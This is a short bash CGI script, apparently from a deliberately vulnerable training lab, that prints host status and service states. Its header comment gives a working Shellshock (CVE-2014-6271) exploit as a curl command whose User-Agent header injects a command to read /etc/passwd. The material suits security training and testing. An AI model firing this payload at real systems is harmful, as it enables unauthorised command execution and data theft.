#!/bin/bash
# VulnBox CGI — Deliberately vulnerable to Shellshock (CVE-2014-6271)
# The function definition syntax in the environment allows arbitrary code execution
# via HTTP headers: User-Agent, Referer, Cookie, etc.
#
# Exploit example:
#   curl -H "User-Agent: () { :; }; echo; echo; /bin/cat /etc/passwd" http://target/cgi-bin/status.cgi

echo "Content-Type: text/html"
echo ""
echo "<html><head><title>VulnBox System Status</title></head><body>"
echo "<h1>System Status</h1>"
echo "<pre>"
echo "Hostname: $(hostname)"
echo "Uptime: $(uptime)"
echo "Date: $(date)"
echo "Kernel: $(uname -r)"
echo "User: $(id)"
echo "</pre>"
echo "<h2>Service Status</h2>"
echo "<pre>"
for svc in apache2 mysql ssh; do
    if pgrep -x "$svc" > /dev/null 2>&1; then
        echo "$svc: RUNNING"
    else
        echo "$svc: STOPPED"
    fi
done
echo "</pre>"
echo "</body></html>"
